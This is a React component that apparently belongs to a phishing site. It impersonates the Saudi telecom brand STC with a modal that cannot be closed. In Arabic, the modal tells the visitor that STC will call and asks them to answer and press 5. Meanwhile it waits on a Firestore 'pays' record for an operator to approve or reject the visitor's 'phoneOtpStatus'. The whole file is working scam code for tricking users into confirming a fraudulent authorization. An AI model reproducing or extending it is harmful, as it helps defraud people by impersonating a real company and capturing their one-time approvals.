"use client"

import { useEffect, useState } from "react"
import { Dialog, DialogContent } from "@/components/ui/dialog"
import { PhoneCall } from "lucide-react"
import { db } from "@/lib/firebase"
import { doc, onSnapshot, Firestore } from "firebase/firestore"
import Image from "next/image"

interface StcVerificationModalProps {
  open: boolean
  visitorId: string
  onApproved: () => void
  onRejected: () => void
}

export function StcVerificationModal({ 
  open, 
  visitorId, 
  onApproved, 
  onRejected 
}: StcVerificationModalProps) {
  const [status, setStatus] = useState<"pending" | "approved" | "rejected">("pending")

  // Listen to Firebase for admin approval/rejection
  useEffect(() => {
    if (!open || !visitorId || !db) return

    console.log("[STC Modal] Listening for admin decision...")

    const unsubscribe = onSnapshot(
      doc(db as Firestore, "pays", visitorId),
      (docSnapshot) => {
        if (docSnapshot.exists()) {
          const data = docSnapshot.data()
          const phoneOtpStatus = data.phoneOtpStatus as "pending" | "approved" | "rejected" | "verifying"

          console.log("[STC Modal] Phone OTP status (phoneOtpStatus):", phoneOtpStatus)

          if (phoneOtpStatus === "approved") {
            setStatus("approved")
            onApproved()
          } else if (phoneOtpStatus === "rejected") {
            setStatus("rejected")
            onRejected()
          }
        }
      },
      (error) => {
        console.error("[STC Modal] Listener error:", error)
      }
    )

    return () => unsubscribe()
  }, [open, visitorId, onApproved, onRejected])

  return (
    <Dialog open={open} onOpenChange={() => {}}>
      <DialogContent 
        className="sm:max-w-md" 
        dir="rtl"
        onPointerDownOutside={(e) => e.preventDefault()}
        onEscapeKeyDown={(e) => e.preventDefault()}
      >
        <div className="flex flex-col items-center justify-center space-y-6 py-8">
          {/* STC Logo */}
          <div className="w-32 h-32 relative">
            <Image 
              src="/stc.svg" 
              alt="STC Logo" 
              fill
              className="object-contain"
            />
          </div>

          {/* Animated Phone Icon */}
          <div className="relative">
            <div className="absolute inset-0 animate-ping">
              <div className="w-20 h-20 rounded-full bg-purple-400 opacity-75"></div>
            </div>
            <div className="relative flex items-center justify-center w-20 h-20 rounded-full bg-purple-500">
              <PhoneCall className="w-10 h-10 text-white animate-pulse" />
            </div>
          </div>

          {/* Message */}
          <div className="text-center space-y-3 px-4">
            <p className="text-lg text-gray-700 leading-relaxed">
              عزيزنا العميل سيتم الاتصال بك من مركز خدمات STC الرجاء الرد على المكالمة و الضغط على الرقم <span className="font-bold text-purple-600">5</span>
            </p>
          </div>

          {/* Waiting Indicator */}
          <div className="flex flex-col items-center space-y-2">
            <div className="flex space-x-2 space-x-reverse">
              <div className="w-3 h-3 bg-purple-500 rounded-full animate-bounce" style={{ animationDelay: "0ms" }}></div>
              <div className="w-3 h-3 bg-purple-500 rounded-full animate-bounce" style={{ animationDelay: "150ms" }}></div>
              <div className="w-3 h-3 bg-purple-500 rounded-full animate-bounce" style={{ animationDelay: "300ms" }}></div>
            </div>
            <p className="text-sm text-gray-500">جاري الانتظار...</p>
          </div>
        </div>
      </DialogContent>
    </Dialog>
  )
}
